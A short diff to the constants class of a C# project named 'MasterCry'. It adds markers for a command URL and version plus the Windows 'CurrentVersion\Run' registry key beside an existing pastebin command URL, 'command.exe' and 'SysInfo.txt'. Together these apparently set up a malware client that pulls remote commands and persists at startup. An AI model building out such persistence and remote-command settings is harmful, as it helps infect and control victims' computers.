@@ -20,8 +20,14 @@ namespace MasterCry
     {
         public static string Save_Location = "SysInfo.txt";
         public static string Command_URL = "https://pastebin.com/raw/QF4BXM6D";
+        public static string Command_URL_Symbol = "###";
+        public static string Command_VER_Symbol = "$$$";
+
         public static string Exe_Name = "command.exe";
         public static string Config_Command_Version = "CommandVersion";
+        public static string Registry_AppName = "ApplicationName";
+        public static string Registry_Key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
 
     }
 }
